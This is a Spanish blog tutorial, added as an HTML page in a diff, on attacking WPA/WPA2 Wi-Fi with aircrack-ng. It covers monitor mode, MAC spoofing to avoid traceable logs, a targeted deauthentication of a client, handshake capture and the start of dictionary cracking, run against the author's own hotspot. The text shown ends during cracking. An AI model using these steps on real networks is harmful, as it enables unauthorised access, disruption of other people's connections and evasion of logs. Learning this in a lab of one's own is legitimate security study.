@@ -1,0 +1,1342 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Hacking Wifi - WPA2 · MiguelRega7</title>
+<meta name="description" content="Como ya sabemos necesitas una antena que acepte modo monitor en el anterior post deje el link de una antena que recomiendo al igual que muchas personas en este post nos vamos a est"><meta name="theme-color" content="#070a0f">
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="header"><div class="nav wrap">
+<a class="brand" href="/" aria-label="MiguelRega7">MR<em>7</em></a>
+<nav class="links"><a class="nav-link" data-nav="home" href="/">INICIO</a><a class="nav-link" data-nav="writeups" href="/#writeups">WRITEUPS</a><a class="nav-link" data-nav="about" href="/about/">ABOUT</a></nav>
+<div class="socials">
+<a href="https://github.com/MikeRega7" target="_blank" rel="noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .7a11.5 11.5 0 0 0-3.64 22.4c.58.1.79-.25.79-.56v-2.04c-3.2.7-3.87-1.35-3.87-1.35-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.75 1.18 1.75 1.18 1.02 1.74 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.53-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.18-3.1-.12-.3-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.73 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.75.11 3.05.74.81 1.18 1.84 1.18 3.1 0 4.43-2.7 5.4-5.26 5.69.41.35.77 1.04.77 2.1v3.07c0 .31.21.67.8.55A11.5 11.5 0 0 0 12 .7Z"/></svg></a>
+<a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" rel="noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5.2 3.2A2.2 2.2 0 1 1 5.2 7.6a2.2 2.2 0 0 1 0-4.4ZM3.4 8.9h3.6V20H3.4V8.9Zm5.8 0h3.4v1.52h.05c.47-.9 1.62-1.84 3.34-1.84 3.57 0 4.23 2.35 4.23 5.4V20h-3.55v-5.34c0-1.27-.02-2.91-1.77-2.91-1.78 0-2.05 1.39-2.05 2.82V20H9.2V8.9Z"/></svg></a>
+<a href="https://www.instagram.com/_miguelitornuno7" target="_blank" rel="noreferrer" aria-label="Instagram"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.8" d="M7 2.9h10A4.1 4.1 0 0 1 21.1 7v10a4.1 4.1 0 0 1-4.1 4.1H7A4.1 4.1 0 0 1 2.9 17V7A4.1 4.1 0 0 1 7 2.9Z"/><circle cx="12" cy="12" r="3.3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.5" cy="6.7" r=".9" fill="currentColor"/></svg></a>
+
+</div><button class="menu" type="button" aria-label="Abrir menú" aria-expanded="false">☰</button>
+</div></header>
+<main class="wrap"><header class="article-head"><a class="back" href="/#writeups">← VOLVER A WRITEUPS</a><div class="article-head-row"><div><span class="article-tag">Wi-Fi</span><h1>Hacking Wifi - WPA2</h1><div class="meta"><span>◷</span><time>2024-03-20</time><span>·</span><span>WRITEUP</span><span>·</span><span>MR7 LAB</span></div></div><div class="share"><span>Compartir</span><button type="button" class="share-btn" data-copy-url="true">↗</button></div></div><p class="article-excerpt">Como ya sabemos necesitas una antena que acepte modo monitor en el anterior post deje el link de una antena que recomiendo al igual que muchas personas en este post nos vamos a est.</p></header><div class="article-layout"><aside class="aside"><div class="aside-title">CONTENIDO</div><a href="#modo-monitor">Modo monitor</a><a href="#falsificaci-n-de-la-direcci-n-mac">Falsificación de la dirección MAC</a><a href="#analizando-el-entorno">Analizando el entorno</a><a href="#ataque-para-capturar-el-handshake-deautenticaci-n-dirigido">Ataque para capturar el Handshake (Deautenticación dirigido)</a><a href="#ataque-de-de-autenticacion-global">Ataque de De-Autenticacion Global</a><a href="#ataque-de-autenticaci-n">Ataque de Autenticación</a><a href="#cts-frame-attack">CTS Frame attack</a><a href="#beacon-flood-mode-attack">Beacon Flood Mode Attack</a></aside><article class="article-content" id="top"><p align="center">
+<img src="/assets/wifi/hacking-wpa2/portal.png">
+</p>
+
+<blockquote>
+<p>Como ya sabemos necesitas una antena que acepte modo monitor en el anterior post deje el link de una antena que recomiendo al igual que muchas personas en este post nos vamos a estar enfocando en <strong>WPA/WPA2</strong>, los puntos de acceso los estaremos montando desde nuestro celular como en el post anterior simplemente indicando la contraseña y que es <strong>WPA o WPA2</strong>.</p>
+</blockquote>
+<h2 id="modo-monitor">Modo monitor</h2>
+<ul>
+<li>Vamos a conectar nuestra antena en mi caso ya estaría recuerda que tu antena puede tener un nombre diferente.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ ifconfig wlx9cefd5f91ec0
+wlx9cefd5f91ec0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
+        ether 5a:46:ba:ee:43:6e  txqueuelen 1000  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</code></pre></div></div>
+<ul>
+<li>Y bueno ahora vamos a poner la antena en modo monitor para poder desplegar los ataques.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ airmon-ng start wlx9cefd5f91ec0
+
+Found 2 processes that could cause trouble.
+Kill them using 'airmon-ng check kill' before putting
+the card in monitor mode, they will interfere by changing channels
+and sometimes putting the interface back in managed mode
+
+    PID Name
+    675 NetworkManager
+    685 wpa_supplicant
+
+PHY	Interface	Driver		Chipset
+
+phy0	wlx9cefd5f91ec0	rt2800usb	Ralink Technology, Corp. RT5572
+Interface wlx9cefd5f91ec0mon is too long for linux so it will be renamed to the old style (wlan#) name.
+
+		(mac80211 monitor mode vif enabled on [phy0]wlan0mon
+		(mac80211 station mode vif disabled for [phy0]wlx9cefd5f91ec0)
+</code></pre></div></div>
+<ul>
+<li>Ahora como vemos ya esta en modo monitor.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ ifconfig wlan0mon
+wlan0mon: flags=4098&lt;BROADCAST,MULTICAST&gt;  mtu 1500
+        unspec 9C-EF-D5-F9-1E-C0-D8-AA-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</code></pre></div></div>
+<ul>
+<li><p>Cuando iniciamos el modo monitor con <code>airmon-ng</code> vemos 2 procesos conflictivos que necesitamos matar por detras son los que nos permiten estar conectados a una red inalambrica y nos otorga una <strong>IP</strong> por <strong>DHCP</strong>.</p>
+</li>
+<li><p>Cuando estamos en modo monitor perdemos conectividad a internet a si que como son conflictivos los procesos vamos a matar estos procesos para no tener inconvenientes.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ killall dhclient wpa_supplicant
+</code></pre></div></div>
+<h2 id="falsificaci-n-de-la-direcci-n-mac">Falsificación de la dirección MAC</h2>
+<ul>
+<li>Pues bueno aunque no tengamos <strong>IP</strong> por que estamos en modo monitor seguimos teniendo la dirección <strong>MAC</strong> ala hora de desplegar los ataques pueden quedar registros que relacionen nuestro dispositivo a si que lo que podemos hacer es falsificar nuestra dirección <strong>MAC</strong> lo único es que tenemos que dar de baja la antena en modo monitor ya que no podemos cambiar la <strong>MAC</strong> mientras este activa a si que vamos a darla de baja.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ ifconfig wlan0mon down
+</code></pre></div></div>
+<ul>
+<li>Para cambiar la <strong>MAC</strong> vamos a usar <code>macchanger</code> aquí vemos los parámetros de la herramienta.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ macchanger --help
+GNU MAC Changer
+Usage: macchanger [options] device
+
+  -h,  --help                   Print this help
+  -V,  --version                Print version and exit
+  -s,  --show                   Print the MAC address and exit
+  -e,  --ending                 Don't change the vendor bytes
+  -a,  --another                Set random vendor MAC of the same kind
+  -A                            Set random vendor MAC of any kind
+  -p,  --permanent              Reset to original, permanent hardware MAC
+  -r,  --random                 Set fully random MAC
+  -l,  --list[=keyword]         Print known vendors
+  -b,  --bia                    Pretend to be a burned-in-address
+  -m,  --mac=XX:XX:XX:XX:XX:XX
+       --mac XX:XX:XX:XX:XX:XX  Set the MAC XX:XX:XX:XX:XX:XX
+
+Report bugs to https://github.com/alobbs/macchanger/issues
+</code></pre></div></div>
+<ul>
+<li>Como tal podemos ver que esta es nuestra actual dirección <strong>MAC</strong> en base al <strong>OUI</strong> se puede saber que es o a quien pertenece un dispositivo en este caso no me lo detecta por que no sabe.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ macchanger -s wlan0mon
+Current MAC:   9c:ef:d5:f9:1e:c0 (unknown)
+Permanent MAC: 9c:ef:d5:f9:1e:c0 (unknown)
+</code></pre></div></div>
+<ul>
+<li>Una ejemplo es este aquí vemos el <strong>OUI</strong> de <strong>Vmware</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ macchanger -l | grep -i vmware
+1386 - 00:05:69 - VMware, Inc.
+3086 - 00:0c:29 - VMware, Inc.
+7161 - 00:1c:14 - VMware, Inc
+10601 - 00:50:56 - VMware, Inc.
+</code></pre></div></div>
+<ul>
+<li>Podemos asignarnos una dirección <strong>MAC</strong> aleatoria o una en especifica se hace de la siguiente forma.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ macchanger -a wlan0mon
+Current MAC:   9c:ef:d5:f9:1e:c0 (unknown)
+Permanent MAC: 9c:ef:d5:f9:1e:c0 (unknown)
+New MAC:       00:06:47:93:d7:70 (Etrali S.A.)
+</code></pre></div></div>
+<ul>
+<li>Ahora tenemos la <strong>MAC</strong> de <strong>Etrali S.A.</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ macchanger -s wlan0mon
+Current MAC:   00:06:47:93:d7:70 (Etrali S.A.)
+Permanent MAC: 9c:ef:d5:f9:1e:c0 (unknown)
+</code></pre></div></div>
+<ul>
+<li>Podemos asignarnos una <strong>MAC</strong> en especifica en este caso a mi me interesa asignarme esta <strong>MAC</strong> para hacerme pasar por la <strong>DEA</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ macchanger -l | grep -i &quot;Dea Security&quot;
+5383 - 00:15:22 - Dea Security
+</code></pre></div></div>
+<ul>
+<li>Para hacerlo simplemente le asignamos el <strong>OUI</strong>  y algo aleatorio.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ macchanger --mac=&quot;00:15:22:ad:bc:21&quot; wlan0mon
+Current MAC:   00:06:47:93:d7:70 (Etrali S.A.)
+Permanent MAC: 9c:ef:d5:f9:1e:c0 (unknown)
+New MAC:       00:15:22:ad:bc:21 (Dea Security)
+</code></pre></div></div>
+<ul>
+<li>Ahora vamos a dar de alta la tarjeta de red.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ ifconfig wlan0mon up
+</code></pre></div></div>
+<ul>
+<li>Ahora vemos que tenemos la de la <strong>Dea</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ macchanger -s wlan0mon
+Current MAC:   00:15:22:ad:bc:21 (Dea Security)
+Permanent MAC: 9c:ef:d5:f9:1e:c0 (unknown)
+</code></pre></div></div>
+<ul>
+<li>Si quieres restablecer todo a como estaba por defecto es muy fácil recuerda que primeramente tenemos que darla de baja para que pueda funcionar.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ ifconfig wlan0mon down
+</code></pre></div></div>
+<ul>
+<li>Y ahora hacemos lo siguiente.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ macchanger -p wlan0mon
+Current MAC:   00:15:22:ad:bc:21 (Dea Security)
+Permanent MAC: 9c:ef:d5:f9:1e:c0 (unknown)
+New MAC:       9c:ef:d5:f9:1e:c0 (unknown)
+❯ ifconfig wlan0mon up
+❯ airmon-ng stop wlan0mon
+
+PHY	Interface	Driver		Chipset
+
+phy0	wlan0mon	rt2800usb	Ralink Technology, Corp. RT5572
+		(mac80211 station mode vif enabled on [phy0]wlan0)
+		(mac80211 monitor mode vif disabled for [phy0]wlan0mon)
+</code></pre></div></div>
+<ul>
+<li>Ahora lo necesitamos reiniciar este servicio.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ /etc/init.d/networking restart
+Restarting networking (via systemctl): networking.service.
+</code></pre></div></div>
+<ul>
+<li>Y bueno después de volver a poner la tarjeta en modo monitor otra vez vemos que ahora tiene la dirección <strong>MAC</strong> original puedes cambiarla otra vez pero en mi caso no lo haré por que todos los ataques los estaremos haciendo en local y no atacando a alguna red que no nos pertenece en ese caso si no la cambiáramos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ macchanger -s wlan0mon
+Current MAC:   9c:ef:d5:f9:1e:c0 (unknown)
+Permanent MAC: 9c:ef:d5:f9:1e:c0 (unknown)
+</code></pre></div></div>
+<h2 id="analizando-el-entorno">Analizando el entorno</h2>
+<ul>
+<li>Ahora lo que vamos a hacer es ver las redes inalambricas que están disponibles en el entorno para hacerlo simplemente ejecutamos lo siguiente.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ airodump-ng wlan0mon
+</code></pre></div></div>
+<ul>
+<li>Hay podemos ver en mi caso las redes inalambricas en mi entorno disponibles recordar que el <strong>ESSID</strong> es el nombre de la red wifi el <strong>BSSID</strong> es la dirección <strong>MAC</strong> del punto de acceso el <strong>PWR</strong> es para que tan cerca esta de nosotros entre mas cerca estemos mejor.</li>
+</ul>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web1.png">
+</p>
+
+<ul>
+<li>Lo que hecho ahora es crearme un punto de acceso desde el celular que lo tengo alado para que vean que vamos a tener esta red muy cerca si volvemos a ejecutar <code>airodump-ng wlan0mon</code> la veremos ademas sabemos que la autenticación es <strong>PSK</strong> ya que tenemos que proporcionar una contraseña para poder conectarnos.</li>
+</ul>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web2.png">
+</p>
+
+<ul>
+<li><p>Bueno algo a saber es la que la sección de abajo corresponde a los clientes que están conectanos a un punto de acceso.</p>
+</li>
+<li><p><strong>STATION</strong> es un cliente puede ser un celular un ordenador o lo que sea y el <strong>BSSID</strong> nos dice que esta asociado a ese punto de acceso vemos que el punto de acceso termina en <strong>94:E4</strong> y si nos fijamos corresponde a <strong>Totalplay-E39F</strong> que es de algún vecino quiero pensar el <strong>PWR</strong> es <strong>-1</strong> pero la red esta algo alejada de mi, los <strong>Frames</strong> entre mas valla aumentando ese significa que el cliente esta activo en la red, cuando nos dice <strong>&lt;length: 0&gt;</strong> es que la red esta oculta.</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web3.png">
+</p>
+
+<ul>
+<li>Lo que podemos hacer es filtrar directamente por una red en especifico con el <strong>CH</strong> y el <strong>ESSID</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ airodump-ng -c 1 --essid MiguelWifi wlan0mon
+</code></pre></div></div>
+<ul>
+<li>Hay vemos muchos clientes asociados a otros AP y 1 al nuestro.</li>
+</ul>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web4.png">
+</p>
+
+<ul>
+<li>Si aumentan los <strong>Frames</strong> sabemos que el cliente esta activo si expulsamos a un cliente de la red estaremos haciendo un ataque de desautenticacion para cuando se reconecte de forma automática capturar el hash podemos guardar todo en una captura (cambie el canal por que cambie el punto de acceso).</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ airodump-ng -c 6 -w Captura --essid MiguelWifi wlan0mon
+</code></pre></div></div>
+<ul>
+<li>Vemos todo el trafico.</li>
+</ul>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web5.png">
+</p>
+
+<ul>
+<li>Si paramos esto y hacemos un <code>ls</code> vemos las capturas.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ ll
+.rw-r--r-- root root  18 KB Wed Aug 30 12:27:14 2023  Captura-01.cap
+.rw-r--r-- root root 2.0 KB Wed Aug 30 12:27:16 2023  Captura-01.csv
+.rw-r--r-- root root 590 B  Wed Aug 30 12:27:16 2023  Captura-01.kismet.csv
+.rw-r--r-- root root  29 KB Wed Aug 30 12:27:16 2023  Captura-01.kismet.netxml
+.rw-r--r-- root root 449 KB Wed Aug 30 12:27:16 2023  Captura-01.log.csv
+</code></pre></div></div>
+<ul>
+<li>La mas interesante es la <strong>.cap</strong> ya que hay es donde esta el <strong>handshake</strong> y toda la información importante.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ file *
+Captura-01.cap:           pcap capture file, microsecond ts (little-endian) - version 2.4 (802.11, capture length 65535)
+Captura-01.csv:           ASCII text, with CRLF line terminators
+Captura-01.kismet.csv:    ASCII text, with very long lines, with CRLF, LF line terminators
+Captura-01.kismet.netxml: XML 1.0 document, ASCII text
+Captura-01.log.csv:       CSV text
+</code></pre></div></div>
+<h2 id="ataque-para-capturar-el-handshake-deautenticaci-n-dirigido">Ataque para capturar el Handshake (Deautenticación dirigido)</h2>
+<ul>
+<li><p>Este es una de los ataques mas comunes.</p>
+</li>
+<li><p>Vamos a seguir monitoreando el trafico de la red que creamos.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ airodump-ng -c 6 -w Captura --essid MiguelWifi wlan0mon
+</code></pre></div></div>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/webnew.png">
+</p>
+
+<ul>
+<li><p>Este es el equipo que quiero expulsar de la red <strong>80:30:49:81:DC:AD</strong> (Estos ataques solo funcionan para <strong>(WPA/WPA2</strong>) de autenticacion <strong>PSK</strong> los de usuario y contraseña son otro tipo de ataque.</p>
+</li>
+<li><p>Vamos a usar <code>aireplay-ng</code>.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ aireplay-ng --help | tail -n 13
+      --deauth      count : deauthenticate 1 or all stations (-0)
+      --fakeauth    delay : fake authentication with AP (-1)
+      --interactive       : interactive frame selection (-2)
+      --arpreplay         : standard ARP-request replay (-3)
+      --chopchop          : decrypt/chopchop WEP packet (-4)
+      --fragment          : generates valid keystream   (-5)
+      --caffe-latte       : query a client for new IVs  (-6)
+      --cfrag             : fragments against a client  (-7)
+      --migmode           : attacks WPA migration mode  (-8)
+      --test              : tests injection and quality (-9)
+
+      --help              : Displays this usage screen
+</code></pre></div></div>
+<ul>
+<li><p>El <strong>-0</strong> nos permite deautenticar una estación de una red inalambrica lo vamos a expulsar para que cuando se vuelva a conectar se genere el <strong>handshake</strong> y lo podamos capturar.</p>
+</li>
+<li><p>Vamos a emitir 10 paquetes de deautenticacion del punto de acceso.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ aireplay-ng -0 15 -e MiguelWifi -c 80:30:49:81:DC:AD wlan0mon
+03:21:06  Waiting for beacon frame (ESSID: MiguelWifi) on channel 1
+Found BSSID &quot;C6:BF:FD:55:E2:F7&quot; to given ESSID &quot;MiguelWifi&quot;.
+03:21:07  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [ 0|47 ACKs]
+03:21:07  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [38|72 ACKs]
+03:21:08  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [63|68 ACKs]
+03:21:08  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [61|57 ACKs]
+03:21:09  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [70|75 ACKs]
+03:21:10  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [61|64 ACKs]
+03:21:10  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [61|84 ACKs]
+03:21:11  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [61|63 ACKs]
+03:21:12  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [61|81 ACKs]
+03:21:12  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [58|79 ACKs]
+03:21:13  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [63|64 ACKs]
+03:21:14  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [42|67 ACKs]
+03:21:14  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [60|64 ACKs]
+03:21:15  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [47|72 ACKs]
+03:21:16  Sending 64 directed DeAuth (code 7). STMAC: [80:30:49:81:DC:AD] [31|75 ACKs]
+</code></pre></div></div>
+<ul>
+<li>Esto lo que hice fue expulsar al cliente de la red y ahora ya capturamos el <strong>Handshake</strong> ya se conecte automáticamente.</li>
+</ul>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web7new.png">
+</p>
+
+<ul>
+<li>Procedemos a crackear para ver la contraseña.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-02.cap
+Reading packets, please wait...
+Opening Captura-02.cap
+Read 6933 packets.
+
+
+                               Aircrack-ng 1.6 
+
+      [00:00:00] 115/10303727 keys tested (576.74 k/s) 
+
